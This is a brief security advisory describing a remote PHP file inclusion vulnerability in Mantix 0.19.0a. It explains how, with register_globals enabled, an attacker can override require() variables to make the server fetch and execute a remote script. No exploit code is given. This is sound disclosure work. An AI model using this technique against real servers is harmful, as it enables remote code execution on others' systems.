Mantix is reportedly susceptible to a remote server-side script execution vulnerability. This vulnerability only presents itself when PHP is configured on the hosting computer with 'register_globals = on'.

When PHP is configured to register global variables, an attacker can override variables used by the application in require() statements. By including a URI reference to a web server hosting a malicious script in GET, POST, or cookie data, an attacker can cause the PHP interpreter on the server hosting the affected package to request and execute attacker-supplied code.

This vulnerability could be exploited by a remote attacker to execute arbitrary script code in the context of the server hosting the affected application.

Version 0.19.0a is reported vulnerable to this issue. Other versions are also likely affected.
